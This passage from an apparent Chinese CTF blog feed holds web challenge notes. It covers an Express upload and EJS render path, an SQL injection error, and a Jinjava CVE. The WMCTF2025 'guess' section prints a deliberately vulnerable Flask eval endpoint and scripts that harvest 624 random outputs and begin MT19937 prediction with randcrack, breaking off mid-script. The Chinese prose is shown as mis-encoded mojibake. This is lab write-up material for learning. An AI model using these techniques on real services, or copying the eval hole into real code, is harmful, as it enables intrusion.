function">listen</span><span class="token punctuation">(</span><span class="token constant">PORT</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Static server is running on http://localhost:</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token constant">PORT</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç›®æ ‡æ˜¯ RCEï¼Œå…ˆçœ‹ä¸€ä¸‹æˆ‘ä»¬å¯æ§çš„ä¸œè¥¿</p><p>å½“è·¯å¾„ç»“å°¾ä¸º &#x2F; æ—¶ï¼Œè°ƒç”¨ serveIndex</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// serve index for better viewing</span><span class="token keyword">function</span> <span class="token function">serveIndex</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> templ <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>templ <span class="token operator">||</span> <span class="token string">'index'</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> lsPath <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> req<span class="token punctuation">.</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span>templ<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>            <span class="token literal-property property">filenames</span><span class="token operator">:</span> fs<span class="token punctuation">.</span><span class="token function">readdirSync</span><span class="token punctuation">(</span>lsPath<span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token literal-property property">path</span><span class="token operator">:</span> req<span class="token punctuation">.</span>path        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>        res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Error rendering page'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ­¤å¤„å¯ä»¥æŒ‡å®š templ å’Œè¦ä½œä¸ºæ¨¡æ¿å‚æ•°çš„ path è·¯å¾„è¿›è¡Œ ejs æ¸²æŸ“ï¼Œä½†æ˜¯ ejs 3.1.10</p><p>æ–‡ä»¶ä¸Šä¼ éƒ¨åˆ†</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// Security middleware</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> req<span class="token punctuation">.</span>path <span class="token operator">!==</span> <span class="token string">'string'</span> <span class="token operator">||</span>             <span class="token punctuation">(</span><span class="token keyword">typeof</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>templ <span class="token operator">!==</span> <span class="token string">'string'</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">typeof</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>templ <span class="token operator">!==</span> <span class="token string">'undefined'</span><span class="token punctuation">)</span>        <span class="token punctuation">)</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Error parsing path'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">js$|\.\.</span><span class="token regex-delimiter">/</span><span class="token regex-flags">i</span></span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>path<span class="token punctuation">)</span><span class="token punctuation">)</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">403</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Denied filename'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token comment">// Upload operation handler</span>app<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">'/*'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> filePath <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token constant">STATIC_DIR</span><span class="token punctuation">,</span> req<span class="token punctuation">.</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>fs<span class="token punctuation">.</span><span class="token function">existsSync</span><span class="token punctuation">(</span>filePath<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'File already exists'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    fs<span class="token punctuation">.</span><span class="token function">writeFile</span><span class="token punctuation">(</span>filePath<span class="token punctuation">,</span> Buffer<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>content<span class="token punctuation">,</span> <span class="token string">'base64'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">err</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Error writing file'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">201</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'File created/updated'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>PUT ä¸Šä¼ æ–‡ä»¶ï¼Œè·¯å¾„ä¸Šè¿‡æ»¤ js ç»“å°¾ã€..ï¼Œè¿™æ ·å­å°±ä¸å¥½ç”¨ express å¼•æ“è§£æç»•è¿‡äº†</p><hr><h2 id="evil-loginï¼ˆUnsolvedï¼‰"><a href="#evil-loginï¼ˆUnsolvedï¼‰" class="headerlink" title="evil_loginï¼ˆUnsolvedï¼‰"></a>evil_loginï¼ˆUnsolvedï¼‰</h2><p>åªæœ‰ä¸€ä¸ªç™»å½•çš„åŠŸèƒ½ç‚¹</p><p>guest:guest1234 ç™»å½•</p><p>å¾—åˆ° hs256 çš„ jwt</p><hr><h2 id="update-itï¼ˆUnsolvedï¼‰"><a href="#update-itï¼ˆUnsolvedï¼‰" class="headerlink" title="update_itï¼ˆUnsolvedï¼‰"></a>update_itï¼ˆUnsolvedï¼‰</h2><p>update åŠŸèƒ½ username å¤„å•å¼•å·ç›´æ¥æŠ¥é”™</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">error occurred <span class="token keyword">while</span> executing <span class="token comment">### update ycb_user set username='1'' where open_id='1'### You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '1'' at line 1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="é‡‘Javaï¼ˆUnsolvedï¼‰"><a href="#é‡‘Javaï¼ˆUnsolvedï¼‰" class="headerlink" title="é‡‘Javaï¼ˆUnsolvedï¼‰"></a>é‡‘Javaï¼ˆUnsolvedï¼‰</h2><p>jinjava æ¨¡æ¿</p><p>CVE-2025-59340? <a href="https://github.com/HubSpot/jinjava/security/advisories/GHSA-m49c-g9wr-hv6v">https://github.com/HubSpot/jinjava/security/advisories/GHSA-m49c-g9wr-hv6v</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;qwb å‰ç»&lt;/p&gt;
&lt;p&gt;å‚è€ƒï¼š&lt;a href=&quot;https://mp.weixin.qq.com/s/2HVCBFKdr8q7-xyAfJecbA&quot;&gt;https://mp.weixin.qq.com/s/2HVCBFKdr8q7-xyAfJecbA&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="CTFçº¿ä¸Šèµ›" scheme="http://c1oudfl0w0.github.io/blog/categories/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
    
    
  </entry>
  
  <entry>
    <title>WMCTF2025</title>
    <link href="http://c1oudfl0w0.github.io/blog/2025/09/20/WMCTF2025/"/>
    <id>http://c1oudfl0w0.github.io/blog/2025/09/20/WMCTF2025/</id>
    <published>2025-09-20T06:40:11.000Z</published>
    <updated>2025-11-28T02:53:34.415Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>wmc.tf å—ï¼Œå”‰èˆèŒåƒ</p><p>å‚è€ƒï¼š</p><p>MNGA çš„ WPï¼š <a href="https://wx.zsxq.com/group/824215518412">https://wx.zsxq.com/group/824215518412</a></p><span id="more"></span><hr><h1 id="guess"><a href="#guess" class="headerlink" title="guess"></a>guess</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> jsonify<span class="token punctuation">,</span> session<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> redirect<span class="token keyword">import</span> randomrd <span class="token operator">=</span> random<span class="token punctuation">.</span>Random<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">generate_random_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token builtin">str</span><span class="token punctuation">(</span>rd<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">)</span>app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> generate_random_string<span class="token punctuation">(</span><span class="token punctuation">)</span>users <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>a <span class="token operator">=</span> generate_random_string<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/register'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">,</span> <span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'GET'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'register.html'</span><span class="token punctuation">)</span>        data <span class="token operator">=</span> request<span class="token punctuation">.</span>get_json<span class="token punctuation">(</span><span class="token punctuation">)</span>    username <span class="token operator">=</span> data<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span>    password <span class="token operator">=</span> data<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> username <span class="token keyword">or</span> <span class="token keyword">not</span> password<span class="token punctuation">:</span>        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">'error'</span><span class="token punctuation">:</span> <span class="token string">'Username and password are required'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">400</span>        <span class="token keyword">if</span> <span class="token builtin">any</span><span class="token punctuation">(</span>user<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">==</span> username <span class="token keyword">for</span> user <span class="token keyword">in</span> users<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">'error'</span><span class="token punctuation">:</span> <span class="token string">'Username already exists'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">400</span>        user_id <span class="token operator">=</span> generate_random_string<span class="token punctuation">(</span><span class="token punctuation">)</span>        users<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">&#123;</span>        <span class="token string">'user_id'</span><span class="token punctuation">:</span> user_id<span class="token punctuation">,</span>        <span class="token string">'username'</span><span class="token punctuation">:</span> username<span class="token punctuation">,</span>        <span class="token string">'password'</span><span class="token punctuation">:</span> password    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span>        <span class="token string">'message'</span><span class="token punctuation">:</span> <span class="token string">'User registered successfully'</span><span class="token punctuation">,</span>        <span class="token string">'user_id'</span><span class="token punctuation">:</span> user_id    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">201</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">,</span> <span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'GET'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'login.html'</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> request<span class="token punctuation">.</span>get_json<span class="token punctuation">(</span><span class="token punctuation">)</span>    username <span class="token operator">=</span> data<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span>    password <span class="token operator">=</span> data<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> username <span class="token keyword">or</span> <span class="token keyword">not</span> password<span class="token punctuation">:</span>        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">'error'</span><span class="token punctuation">:</span> <span class="token string">'Username and password are required'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">400</span>        user <span class="token operator">=</span> <span class="token builtin">next</span><span class="token punctuation">(</span><span class="token punctuation">(</span>user <span class="token keyword">for</span> user <span class="token keyword">in</span> users <span class="token keyword">if</span> user<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">==</span> username <span class="token keyword">and</span> user<span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span> <span class="token operator">==</span> password<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> user<span class="token punctuation">:</span>        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">'error'</span><span class="token punctuation">:</span> <span class="token string">'Invalid credentials'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">401</span>        session<span class="token punctuation">[</span><span class="token string">'user_id'</span><span class="token punctuation">]</span> <span class="token operator">=</span> user<span class="token punctuation">[</span><span class="token string">'user_id'</span><span class="token punctuation">]</span>    session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> user<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span>        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span>        <span class="token string">'message'</span><span class="token punctuation">:</span> <span class="token string">'Login successful'</span><span class="token punctuation">,</span>        <span class="token string">'user_id'</span><span class="token punctuation">:</span> user<span class="token punctuation">[</span><span class="token string">'user_id'</span><span class="token punctuation">]</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>post</span><span class="token punctuation">(</span><span class="token string">'/api'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">protected_api</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> request<span class="token punctuation">.</span>get_json<span class="token punctuation">(</span><span class="token punctuation">)</span>    key1 <span class="token operator">=</span> data<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'key'</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> key1<span class="token punctuation">:</span>        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">'error'</span><span class="token punctuation">:</span> <span class="token string">'key are required'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">400</span>    key2 <span class="token operator">=</span> generate_random_string<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token builtin">str</span><span class="token punctuation">(</span>key1<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">str</span><span class="token punctuation">(</span>key2<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span>            <span class="token string">'message'</span><span class="token punctuation">:</span> <span class="token string">'Not Allowed:'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>key2<span class="token punctuation">)</span> <span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">403</span>        payload <span class="token operator">=</span> data<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'payload'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> payload<span class="token punctuation">:</span>        <span class="token builtin">eval</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">'__builtin__'</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span>        <span class="token string">'message'</span><span class="token punctuation">:</span> <span class="token string">'Access granted'</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">'user_id'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">5001</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é¦–å…ˆéœ€è¦æ»¡è¶³ <code>str(key1) == str(key2)</code> æ‰èƒ½æ‰“ payloadï¼Œè€Œ key2 æ˜¯ä¸ª  <code>rd.getrandbits(32)</code>ï¼Œæ¯”è¾ƒå¤±è´¥çš„è¯ä¼šè¿”å›ä¸Šä¸€æ¬¡çš„ key2</p><p>æ—©åœ¨ python jail ä¸­æˆ‘ä»¬å°±çŸ¥é“ <code>random.getrandbits</code> é‡‡ç”¨çš„æ˜¯ MT19937 ç®—æ³•ï¼Œè¿™é‡Œæ¯æ¬¡äº§ç”Ÿ 32 bit éšæœºæ•°ï¼Œè€Œæ¯äº§ç”Ÿ 624 æ¬¡éšæœºæ•°å°±è½¬ä¸€è½¬ï¼Œä¹Ÿå°±æ„å‘³ç€æˆ‘ä»¬èƒ½æ‹¿åˆ° 624 ä¸ªéšæœºæ•°çš„è¯å°±èƒ½æ±‚å‡ºä¸‹ä¸€ä¸ªéšæœºæ•°</p><p>å…ˆå†™ä¸€ä¸ªè„šæœ¬è·å– 624 ä¸ªéšæœºæ•°</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> reurl <span class="token operator">=</span> <span class="token string">"http://192.168.31.252:5001/api"</span><span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">624</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    cookie <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">"session"</span><span class="token punctuation">:</span>        <span class="token string">"eyJ1c2VyX2lkIjoiMTI4Nzk0NiIsInVzZXJuYW1lIjoidGVzdCJ9.aM5xqA.Kpyzj4L7dY02Oqgv8a72Mpq1o6o"</span>    <span class="token punctuation">&#125;</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"key"</span><span class="token punctuation">:</span> <span class="token string">"a"</span><span class="token punctuation">,</span> <span class="token string">"payload"</span><span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">&#125;</span>    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> json<span class="token operator">=</span>data<span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookie<span class="token punctuation">,</span>proxies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"http"</span><span class="token punctuation">:</span><span class="token string">"http://127.0.0.1:8083"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    num <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r"(\d+)"</span><span class="token punctuation">,</span> response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"random.txt"</span><span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>num <span class="token operator">+</span> <span class="token string">"\n"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç„¶åé¢„æµ‹ï¼Œå‚è€ƒï¼š<a href="https://blog.csdn.net/qq_57235775/article/details/131168939">https://blog.csdn.net/qq_57235775/article/details/131168939</a></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> randcrack <span class="token keyword">import</span> RandCrack<span class="token keyword">from</span> hashlib <span class="token keyword">import</span> md5<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">r'random.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    l <span class="token operator">=</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>l <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>i<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> l<span class="token punctuation">]</span>arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> i <span class="token operator">%</span> <span class="token number">3</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        arr<span class="token punctuation">.</span>append<span class="token punctuation">(</span>l<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment">#ç¬¬ä¸‰ä½æ•°æˆ–ä¸‰çš„å€æ•°ä½å°±æ˜¯32ä½æ•°ï¼Œç›´æ¥åŠ å…¥</span>    <span class="token keyword">elif</span> i <span class="token operator">%</span> <span class="token number">3</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        arr<span class="token punctuation">.</span>append<span class="token punctuation">(</span>l<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&amp;</span>                   <span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">**</span><span class="token 